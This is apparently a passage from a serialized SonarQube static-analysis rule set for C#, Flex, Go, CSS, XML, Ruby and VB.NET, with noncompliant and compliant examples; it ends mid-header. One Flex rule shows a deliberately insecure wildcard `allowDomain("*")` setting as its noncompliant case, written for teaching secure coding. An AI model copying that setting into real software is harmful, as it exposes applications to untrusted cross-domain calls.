<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/295.html">MITRE, CWE-295</a> - Improper Certificate Validation </li>
</ul>ZVULNERABILITY
Ü
csharpsquid:S4039
csharpsquidS40395Interface methods should be callable by derived types"CRITICAL*cs:à<p>When a base type explicitly implements a public interface method, that method is only accessible in derived types through a reference to the
current instance (namely <code>this</code>). If the derived type explicitly overrides that interface method, the base implementation becomes
inaccessible.</p>
<p>This rule raises an issue when an unsealed, externally visible type provides an explicit method implementation of a <code>public interface</code>
and does not provide an alternate, externally visible method with the same name.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface IMyInterface
{
    void MyMethod();
}

public class Foo : IMyInterface
{
    void IMyInterface.MyMethod() // Noncompliant
    {
        MyMethod();
    }

    void MyMethod()
    {
        // Do something ...
    }
}

public class Bar : Foo, IMyInterface
{
    public void MyMethod()
    {
        // Can't access base.MyMethod()
        // ((IMyInterface)this).MyMethod() would be a recursive call
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface IMyInterface
{
    void MyMethod();
}

public class Foo : IMyInterface
{
    void IMyInterface.MyMethod()
    {
        MyMethod();
    }

    protected void MyMethod() // or public
    {
        // Do something ...
    }
}

public class Bar : Foo, IMyInterface
{
    public void MyMethod()
    {
        // Do something
        base.MyMethod();
    }
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not report a violation for an explicit implementation of <code>IDisposable.Dispose</code> when an externally visible
<code>Close()</code> or <code>System.IDisposable.Dispose(Boolean)</code> method is provided.</p>Z
CODE_SMELL
Ä	
csharpsquid:S4277Í
csharpsquidS4277/"Shared" parts should not be created with "new""CRITICAL*cs:è<p>Marking a class with <code>PartCreationPolicy(CreationPolicy.Shared)</code>, which is part of Managed Extensibility Framework (MEF), means that a
single, shared instance of the exported object will be created. Therefore it doesn't make sense to create new instances using the constructor and it
will most likely result in unexpected behaviours.</p>
<p>This rule raises an issue when a constructor of a class marked shared with a <code>PartCreationPolicyAttribute</code> is invoked.</p>
<h2>Noncompliant Code Example</h2>
<pre>
[Export(typeof(IFooBar))]
[PartCreationPolicy(CreationPolicy.Shared)]
public class FooBar : IFooBar
{
}

public class Program
{
    public static void Main()
    {
        var fooBar = new FooBar(); // Noncompliant;
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
[Export(typeof(IFooBar))]
[PartCreationPolicy(CreationPolicy.Shared)]
public class FooBar : IFooBar
{
}

public class Program
{
    public static void Main()
    {
        var fooBar = serviceProvider.GetService&lt;IFooBar&gt;();
    }
}
</pre>ZBUG
∏
csharpsquid:S4275¢
csharpsquidS42755Getters and setters should access the expected fields"CRITICAL*cs:¡<p>Properties provide a way to enforce encapsulation by providing <code>public</code>, <code>protected</code> or <code>internal</code> methods that
give controlled access to <code>private</code> fields. However in classes with multiple fields it is not unusual that cut and paste is used to quickly
create the needed properties, which can result in the wrong field being accessed by a getter or setter.</p>
<p>This rule raises an issue in any of these cases:</p>
<ul>
  <li> A setter does not update the field with the corresponding name. </li>
  <li> A getter does not access the field with the corresponding name. </li>
</ul>
<p>For simple properties it is better to use <a
href="https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/classes-and-structs/auto-implemented-properties">auto-implemented
properties</a> (C# 3.0 or later).</p>
<h2>Noncompliant Code Example</h2>
<pre>
class A
{
    private int x;
    private int y;

    public int X
    {
        get { return x; }
        set { x = value; }
    }

    public int Y
    {
        get { return x; }  // Noncompliant: field 'y' is not used in the return value
        set { x = value; } // Noncompliant: field 'y' is not updated
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class A
{
    private int x;
    private int y;

    public int X
    {
        get { return x; }
        set { x = value; }
    }

    public int Y
    {
        get { return y; }
        set { y = value; }
    }
}
</pre>ZBUG
‘

flex:S4524≈
flexS4524)"default" clauses should be first or last"CRITICAL*flex:Ó
<p><code>switch</code> can contain a <code>default</code> clause for various reasons: to handle unexpected values, to show that all the cases were
properly considered.</p>
<p>For readability purpose, to help a developer to quickly find the default behavior of a <code>switch</code> statement, it is recommended to put the
<code>default</code> clause at the end of the <code>switch</code> statement. This rule raises an issue if the <code>default</code> clause is not the
first or the last one of the <code>switch</code>'s cases.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  default: // default clause should be the first or last one
    error();
    break;
  case 1:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
  default:
    error();
    break;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause </li>
  <li> MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause </li>
  <li> MISRA C:2012, 16.4 - Every switch statement shall have a default label </li>
  <li> MISRA C:2012, 16.5 - A default label shall appear as either the first or the last switch label of a switch statement </li>
</ul>Z
CODE_SMELL
≥

flex:S1465§
flexS1465â"LocalConnection" should be configured to narrowly specify the domains with which local connections to other Flex application are allowed"CRITICAL*flex:È<p>A <code>LocalConnection</code> object is used to invoke a method in another <code>LocalConnection</code> object, either within a single SWF file or
between multiple SWF files. This kind of local connection should be authorized only when the origin (domain) of the other Flex applications is
perfectly defined. </p>
<h2>Noncompliant Code Example</h2>
<pre>
localConnection.allowDomain("*");
</pre>
<h2>Compliant Solution</h2>
<pre>
localConnection.allowDomain("www.myDomain.com");
</pre>ZVULNERABILITY
Œ	

flex:S1462ø	
flexS14626Event names should not be hardcoded in event listeners"CRITICAL*flex:€<p>Using plain string event names in even listeners is an anti-pattern; if the event is renamed, the application can start behaving unexpectedly. A
constant variable should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import flash.display.Sprite;
import flash.events.MouseEvent;

class ChildSprite extends Sprite
{
    public function ChildSprite()
    {
        ...
        addEventListener("CustomEvent", clickHandler);   // Noncompliant
    }
}

function clickHandler(event:CustomEvent):void
{
    trace("clickHandler detected an event of type: " + event.type);
    trace("the this keyword refers to: " + this);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import flash.display.Sprite;
import flash.events.MouseEvent;

class ChildSprite extends Sprite
{
   public const CUSTOM_EVENT:String = "CustomEvent";

    public function ChildSprite()
    {
        ...
        addEventListener(CUSTOM_EVENT, clickHandler);
    }
}

function clickHandler(event:CustomEvent):void
{
    trace("clickHandler detected an event of type: " + event.type);
    trace("the this keyword refers to: " + this);
}
</pre>Z
CODE_SMELL
—

flex:S1463¬
flexS1463.Event types should be defined in metadata tags"CRITICAL*flex:Ê
<p>According to the Flex documentation :</p>
<blockquote>
  <p>In an ActionScript file, when you define component events or other aspects of a component that affect more than a single property, you add the
  metadata tag outside the class definition so that the metadata is bound to the entire class, as the following example shows:</p>
  <pre>
// Add the [Event] metadata tag outside of the class file.
[Event(name="enableChange", type="flash.events.Event")]
public class ModalText extends TextArea {

    ...

    // Define class properties/methods
    private var _enableTA:Boolean;

    // Add the [Inspectable] metadata tag before the individual property.
    [Inspectable(defaultValue="false")]
    public function set enableTA(val:Boolean):void {
        _enableTA = val;
        this.enabled = val;

        // Define event object, initialize it, then dispatch it.
        var eventObj:Event = new Event("enableChange");
        dispatchEvent(eventObj);
    }
}
</pre>
</blockquote>
<p>In this example, the "enableChange" event must be considered part of the API. Therefore, it should be strongly typed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
[Event(name="enableChange")]
public class ModalText extends TextArea {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
[Event(name="enableChange", type="flash.events.Event")]
public class ModalText extends TextArea {...}
</pre>Z
CODE_SMELL
∞

flex:S1186°
flexS1186Methods should not be empty"CRITICAL*flex:ÿ<p>There are several reasons for a method not to have a method body:</p>
<ul>
  <li> It is an unintentional omission, and should be fixed to prevent an unexpected behavior in production. </li>
  <li> It is not yet, or never will be, supported. In this case an <code>NotSupportedException</code> should be thrown. </li>
  <li> The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public override function doSomething():void {
}

public function doSomethingElse():void {
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public override function doSomething():void {
  throw new IllegalOperationError("doSomething cannot be performed because ...");
}

public function doSomethingElse():void {
  //This method is empty because ...
}
</pre>Z
CODE_SMELL
∏

flex:S1821©
flexS1821("switch" statements should not be nested"CRITICAL*flex:”
<p>Nested <code>switch</code> structures are difficult to understand because you can easily confuse the cases of an inner <code>switch</code> as
belonging to an outer statement. Therefore nested <code>switch</code> statements should be avoided.</p>
<p>Specifically, you should structure your code to avoid the need for nested <code>switch</code> statements, but if you cannot, then consider moving
the inner <code>switch</code> to another function.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public function func(foo:Number, bar:Number):void
{
  switch (foo)
  {
    case 1:
      // do something
      break;
    case 2:
      switch (bar)  // Noncompliant
      {
        case 89:  // It's easy to lose sight of what's being tested; is it foo or bar?
          // ...
          break;
        case 90:
          // ...
          break;
      }
      break;
    case 3:
      // do something
      break;
    default:
      break;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>

public function func(foo:Number, bar:Number):void
{
  switch (foo)
  {
    case 1:
      // ...
      break;
    case 2:
      handleBar(bar);
      break;
    case 3:
      // ...
      break;
    default:
      break;
  }
}

public function handleBar(bar:Number):void
{
  switch (bar)
  {
    case 89:
      // ...
      break;
    case 90:
      // ...
      break;
  }
}
</pre>Z
CODE_SMELL
É
flex:ClassComplexityÍ
flexClassComplexity!Classes should not be too complex"CRITICAL*flex:ë<p>The cyclomatic complexity of a class should not exceed a defined threshold. Complex code can perform poorly and will in any case be difficult to
understand and therefore to maintain.</p>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
é
	flex:S115Ä
flexS1155Constant names should comply with a naming convention"CRITICAL*flex:û<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all constant names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$</code>:</p>
<pre>
public static const first:String = "first";
</pre>
<h2>Compliant Solution</h2>
<pre>
public static const FIRST:String = "first";
</pre>Z
CODE_SMELL
–

flex:S1434¡
flexS14341Variables of the "Object" type should not be used"CRITICAL*flex:‚<p>Creating a new variable with the type "Object" means that it may be used to store any kind of object. This feature may be required in some specific
contexts, but it leaves the compiler unable to do any kind of type checking, and is therefore a hazardous practice. </p>
<h2>Noncompliant Code Example</h2>
<pre>
var obj:Object = new String(); // Noncompliant; Object used explicitly
var foo = new Object(); // Noncompliant; Object used explicitly
var bar = {name:String, age:int};  // Noncompliant; Object implicitly created
</pre>
<h2>Compliant Solution</h2>
<pre>
var obj:String = new String();
var foo:IPortfolio = new Portfolio();
class Person {
  public var name:String;
  public var age:int;
}
var bar:Person = new Person();
</pre>Z
CODE_SMELL
ˆ
	flex:S134Ë
flexS134YControl flow statements "if", "for", "while" and "switch" should not be nested too deeply"CRITICAL*flex:‚<p>Nested <code>if</code>, <code>for</code>, <code>while</code>, <code>do while</code> and <code>switch</code> statements is a key ingredient for
making what's known as "Spaghetti code".</p>
<p>Such code is hard to read, refactor and therefore maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
  if (condition1) {                  // Compliant - depth = 1
    /* ... */
    if (condition2) {                // Compliant - depth = 2
      /* ... */
      for(int i = 0; i &lt; 10; i++) {  // Compliant - depth = 3, not exceeding the limit
        /* ... */
        if (condition4) {            // Noncompliant - depth = 4
          if (condition5) {          // Depth = 5, exceeding the limit, but issues are only reported on depth = 4
            /* ... */
          }
          return;
        }
      }
    }
  }
</pre>Z
CODE_SMELL
Ê
flex:SwitchWithoutDefault»
flexSwitchWithoutDefault1"switch" statements should have "default" clauses"CRITICAL*flex:⁄<p>The requirement for a final <code>default</code> clause is defensive programming. The clause should either take appropriate action, or contain a
suitable comment as to why no action is taken.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (param) { // Noncompliant - default clause is missing
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
}

switch (param) {
  default: // Noncompliant - default clause should be the last one
    doSomething();
    break;
  case 0:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (param) {
  case 0:
    doSomethingElse();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/478.html">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>Z
CODE_SMELL
ó
flex:FunctionComplexity˚
flexFunctionComplexity#Functions should not be too complex"CRITICAL*flex:ù<p>The Cyclomatic Complexity of functions should not exceed a defined threshold. Complex code may perform poorly and can be difficult to test
thoroughly.</p>Z
CODE_SMELL
í

flex:S1435É
flexS1435*The special "star" type should not be used"CRITICAL*flex:´
<p>According to the ActionScript language reference, the star type:</p>
<blockquote>
  <p>Specifies that a property is untyped. Use of the asterisk symbol for a type annotation is equivalent to using no type annotation. Expressions
  that read from untyped properties are considered untyped expressions. Use of untyped expressions or properties is recommended in the following
  circumstances:</p>
  <ul>
    <li> When you want to defer type checking to runtime. You can use an untyped property or expression to circumvent compile-time type checking in
    strict mode. Note, however, that runtime type checking of assignment statements occurs whether you use strict mode or not. </li>
    <li> When you want to store the value undefined in a property. Unlike previous versions of ActionScript, the value undefined is not a member of
    the Object data type. You must use an untyped property to store the value undefined. </li>
  </ul>
</blockquote>
<p>But deferring type checking to runtime can highly impact the robustness of the application because the compiler is unable to assist the
developer.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var obj:*;  // Noncompliant
var foo:* = new Something();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var obj:Something;
var foo:Something = new Something();
</pre>Z
CODE_SMELL
£
go:S3776ñ
goS37768Cognitive Complexity of functions should not be too high"CRITICAL*go:¥<p>Cognitive Complexity is a measure of how hard the control flow of a function is to understand. Functions with high Cognitive Complexity will be
difficult to maintain.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://redirect.sonarsource.com/doc/cognitive-complexity.html">Cognitive Complexity</a> </li>
</ul>Z
CODE_SMELL
ÿ
go:S131Ã
goS1311"switch" statements should have "default" clauses"CRITICAL*go:Ú<p>The requirement for a final <code>default</code> clause is defensive programming. The clause should either take appropriate action, or contain a
suitable comment as to why no action is taken.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch tag { // Noncompliant - default case is missing
case 0, 1, 2, 3:
	foo()
case 4, 5, 6, 7:
	bar()
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch tag {
case 0, 1, 2, 3:
	foo()
case 4, 5, 6, 7:
	bar()
default:
	qix()
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/478.html">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>Z
CODE_SMELL
·
go:S134’
goS134PControl flow statements "if", "for" and "switch" should not be nested too deeply"CRITICAL*go:‹<p>Nested <code>if</code>, <code>for</code>, <code>while</code>, <code>switch</code>, and <code>try</code> statements are key ingredients for making
what's known as "Spaghetti code".</p>
<p>Such code is hard to read, refactor and therefore maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
if condition1 { // Compliant - depth = 1
	/* ... */
	if condition2 { // Compliant - depth = 2
		/* ... */
		for i := 1; i &lt;= 10; i++ { // Compliant - depth = 3, not exceeding the limit
			/* ... */
			if condition4 { // Noncompliant - depth = 4
				if condition5 { // Depth = 5, exceeding the limit, but issues are only reported on depth = 4
					/* ... */
				}
				return
			}
		}
	}
}
</pre>Z
CODE_SMELL
∂
go:S1192©
goS1192(String literals should not be duplicated"CRITICAL*go:◊<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>
<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
func run() {
	prepare("This should be a constant")  // Noncompliant; 'This should ...' is duplicated 3 times
	execute("This should be a constant")
	release("This should be a constant")
}
</pre>
<h2>Compliant Solution</h2>
<pre>
const ACTION = "This should be a constant"

func run() {
	prepare(ACTION)
	execute(ACTION)
	release(ACTION)
}
</pre>
<h2>Exceptions</h2>
<p>To prevent generating some false-positives, literals having 5 or less characters are excluded as well as literals containing only letters, digits
and '_'.</p>Z
CODE_SMELL
¯
go:S126Ï
goS126:"if ... else if" constructs should end with "else" clauses"CRITICAL*go:â<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>else if</code> statements; the final <code>else if</code>
should be followed by an <code>else</code> statement.</p>
<p>The requirement for a final <code>else</code> statement is defensive programming.</p>
<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>default</code> clause in a <code>switch</code> statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if x == 0 {
	doSomething()
} else if x == 1 {
	doSomethingElse()
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if x == 0 {
	doSomething()
} else if x == 1 {
	doSomethingElse()
} else {
	return errors.New("unsupported int")
}
</pre>
<h2>Exceptions</h2>
<p>When all branches of an <code>if</code>-<code>else if</code> end with <code>return</code>, <code>break</code> or <code>throw</code>, the code that
comes after the <code>if</code> implicitly behaves as if it was in an <code>else</code> clause. This rule will therefore ignore that case.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/PQHRAw">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>Z
CODE_SMELL
∂
go:S1067©
goS1067%Expressions should not be too complex"CRITICAL*go:⁄<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code>
operators it contains.</p>
<p>A single expression's complexity should not become too high to keep the code readable.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value of 3:</p>
<pre>
if (((condition1 &amp;&amp; condition2) || (condition3 &amp;&amp; condition4)) &amp;&amp; condition5) { ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
if ( (myFirstCondition() || mySecondCondition()) &amp;&amp; myLastCondition()) { ... }
</pre>Z
CODE_SMELL
¬
go:S1186µ
goS1186Functions should not be empty"CRITICAL*go:Ó<p>There are several reasons for a method not to have a method body:</p>
<ul>
  <li> It is an unintentional omission, and should be fixed to prevent an unexpected behavior in production. </li>
  <li> It is not yet, or never will be, supported. In this case an exception should be thrown. </li>
  <li> The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
func doNothing() { // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
func doNothing() {
  // Do nothing because of X and Y.
}
</pre>Z
CODE_SMELL
ê
go:S1821É
goS1821("switch" statements should not be nested"CRITICAL*go:±<p>Nested <code>switch</code> structures are difficult to understand because you can easily confuse the cases of an inner <code>switch</code> as
belonging to an outer statement. Therefore nested <code>switch</code> statements should be avoided.</p>
<p>Specifically, you should structure your code to avoid the need for nested <code>switch</code> statements, but if you cannot, then consider moving
the inner <code>switch</code> to another function.</p>
<h2>Noncompliant Code Example</h2>
<pre>
func foo(x,y int) {
	switch x {
	case 0:
		switch y { // Noncompliant; nested switch
		// ...
		}
	case 1:
		// ...
	default:
		// ...
	}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
func foo(x,y int) {
	switch x {
	case 0:
		bar(y)
	case 1:
		// ...
	default:
		// ...
	}
}

func bar(y int) {
	switch y {
	// ...
	}
}
</pre>Z
CODE_SMELL
ß
	css:S4657ô
cssS4657PShorthand properties that override related longhand properties should be avoided"CRITICAL*css:§<p>A shorthand property defined after a longhand property will completely override the value defined in the longhand property making the longhand one
useless. The code should be refactored to consider the longhand property or to remove it completely.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a {
  padding-left: 10px;
  padding: 20px; /* Noncompliant; padding is overriding padding-left making it useless */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a {
  padding: 10px; /* Compliant; padding is defining a general behaviour and padding-left, just after, is precising the left case */
  padding-left: 20px;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Shorthand_properties">Mozilla Web Technology for Developers</a> - Shorthand
  properties </li>
</ul>ZBUG
˙
	css:S4651Ï
cssS4651,"linear-gradient" directions should be valid"CRITICAL*css:õ<p><code>linear-gradient</code> was standardized with CSS3. Before that, it was possible to use different non-standard values to define the gradient's
direction. Because these values are not standard, they are not supported in all browsers and therefore they should no longer be used in order to get
the expected gradient in the latest browser versions that support CSS3.</p>
<p>This rule raises an issue when the first parameter of a <code>linear-gradient</code> is not a valid <code>&lt;side-or-corner&gt;</code> or
<code>angle</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
.foo {
  background: linear-gradient(top, #fff, #000);
}

.bar {
  background: linear-gradient(45, #fff, #000);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
.foo {
  background: linear-gradient(to top, #fff, #000);
}

.bar {
  background: linear-gradient(45deg, #fff, #000);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/linear-gradient">Mozilla Web Technology for Developers</a> -
  <code>linear-gradient</code> </li>
</ul>ZBUG
‘
	css:S4664∆
cssS4664\Selectors of lower specificity should come before overriding selectors of higher specificity"CRITICAL*css:æ<p>Order of instructions in CSS is important: instructions with equal specificity that occur later in the file take the priority. But when a selector
with a higher specificity (e.g. <code>p a { color: green;}</code>) comes before the selector it overrides (e.g.: <code>a { color: green;}</code>), the
priority is given to the first one. Even if it works properly, this is harder to anticipate the behaviour of the stylesheet while reading as it goes
against the principle that the last instruction takes the priority.</p>
<h2>Noncompliant Code Example</h2>
<pre>
p a {
  color: green;
}

a {
  color: blue;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a {
  color: blue;
}

p a {
  color: green;
}
</pre>Z
CODE_SMELL
˛
	css:S4670
cssS4670Selectors should be known"CRITICAL*css:≤<p>HTML, SVG, and MathML define the selectors which can be used in a CSS. A selector that is not part of them is likely to be a typo or a
misunderstanding of the CSS syntax.</p>
<h2>Noncompliant Code Example</h2>
<pre>
field {}

ul list {}
</pre>
<h2>Compliant Solution</h2>
<pre>
input {}

ul li {}
</pre>ZBUG
¶
	xml:S1778ò
xmlS1778IXML files containing a prolog header should start with "<?xml" characters"CRITICAL*xml:™<p>The prolog header is the following piece of code that some XML documents start with:</p>
<pre>
&lt;?xml version="y.x" encoding="zzzzz"?&gt;
</pre>
<p>When the prolog exists in an XML document, it should be at the beginning of the file to enable programs to determine the encoding of non-UTF-8,
non-UTF-16 files.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;!-- Generated file --&gt;  &lt;!--  Noncompliant  --&gt;
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;firstNode&gt;
  content
&lt;/firstNode&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!-- Generated file --&gt;
&lt;firstNode&gt;
  content
&lt;/firstNode&gt;
</pre>ZBUG
ﬂ	

ruby:S1451–	
rubyS1451+Track lack of copyright and license headers"BLOCKER*ruby:¯<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>
<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>
<h2>Compliant Solution</h2>
<pre>
#
# SonarQube, open source software quality management tool.
# Copyright (C) 2008-2018 SonarSource
# mailto:contact AT sonarsource DOT com
#
# SonarQube is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 3 of the License, or (at your option) any later version.
#
# SonarQube is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with this program; if not, write to the Free Software Foundation,
# Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
#
</pre>Z
CODE_SMELL
ì

ruby:S2068Ñ
rubyS2068$Credentials should not be hard-coded"BLOCKER*ruby:∞<p>Because it is easy to extract strings from a compiled application, credentials should never be hard-coded. Do so, and they're almost guaranteed to
end up in the hands of an attacker. This is particularly true for applications that are distributed.</p>
<p>Credentials should be stored outside of the code in a strongly-protected encrypted configuration file or database.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It's recommended to customize the configuration of this rule with additional credential words such as "oauthToken", "secret", ...</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/798">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/259">MITRE, CWE-259</a> - Use of Hard-coded Password </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/qQCHAQ">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
  <li> OWASP Top 10 2017 Category A2 - Broken Authentication </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>ZVULNERABILITY
¢

ruby:S1314ì
rubyS1314Octal values should not be used"BLOCKER*ruby:«
<p>Integer literals starting with a zero are octal rather than decimal values. While using octal values is fully supported, most developers do not
have experience with them. They may not recognize octal values as such, mistaking them instead for decimal values.</p>
<h2>Noncompliant Code Example</h2>
<pre>
my_number = 023 # Noncompliant. my_number will hold 19, not 23 - was this really expected?
</pre>
<h2>Compliant Solution</h2>
<pre>
my_number = 23
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to values smaller than 8 and octal values having 3 digits, since 3 digits octal values are often used as file permission
masks.</p>
<p>Example:</p>
<pre>
permission_mask = 0777
day_of_month = 03
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 7.1 - Octal constants (other than zero) and octal escape sequences shall not be used. </li>
  <li> MISRA C++:2008, 2-13-2 - Octal constants (other than zero) and octal escape sequences (other than "\0") shall not be used </li>
  <li> MISRA C:2012, 7.1 - Octal constants shall not be used </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/_QC7AQ">CERT, DCL18-C.</a> - Do not begin integer constants with 0 when specifying a
  decimal value </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/hYClBg">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>
</ul>Z
CODE_SMELL
ò
vbnet:S1147à
vbnetS1147#"End" statements should not be used"BLOCKER*vbnet:∂<p><code>End</code> statements exit the control flow of the program in an unstructured way. This statement stops code execution immediately without
executing <code>Dispose</code> or <code>Finalize</code> methods, or executing <code>Finally</code> blocks. Therefore, it should be avoided.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Print(ByVal str As String)
       Try
            ...
            End       ' Noncompliant
        Finally
            ' do something important here
            ...
        End Try
    End Sub
End Module
</pre>Z
CODE_SMELL
“
vbnet:S2178¬
vbnetS21786Short-circuit logic should be used in boolean contexts"BLOCKER*vbnet:›<p>The use of non-short-circuit logic in a boolean context is likely a mistake - one that could cause serious program errors as conditions are
evaluated under the wrong circumstances. </p>
<h2>Noncompliant Code Example</h2>
<pre>
If GetTrue() Or GetFalse() Then ' Noncompliant; both sides evaluated
End If
</pre>
<h2>Compliant Solution</h2>
<pre>
If GetTrue() OrElse GetFalse() Then ' true short-circuit logic
End If
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/g4FtAg">CERT, EXP46-C.</a> - Do not use a bitwise operator with a Boolean-like operand
  </li>
</ul>Z
CODE_SMELL
∏
vbnet:S1451®
vbnetS1451+Track lack of copyright and license headers"BLOCKER*vbnet:Œ<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>
<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>
<p>The <code>headerFormat</code> must end with an empty line if you want to have an empty line between the file header and the first line for your
source file (<code>using</code>, <code>namespace</code>...).</p>
<p>For example, if you want the source file to look like this</p>
<pre>
' Copyright (c) SonarSource. All Rights Reserved. Licensed under the LGPL License.  See License.txt in the project root for license information.

namespace Foo
{
}
</pre>
<p>then the <code>headerFormat</code> parameter should end with an empty line like this</p>
<pre>
' Copyright (c) SonarSource. All Rights Reserved. Licensed under the LGPL License.  See License.txt in the project root for license information.

</pre>
<h2>Compliant Solution</h2>
<pre>
/*
 * SonarQube, open source software quality management tool.
 * Copyright (C) 2008-2013 SonarSource
 * mailto:contact AT sonarsource DOT com
 *
 * SonarQube is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
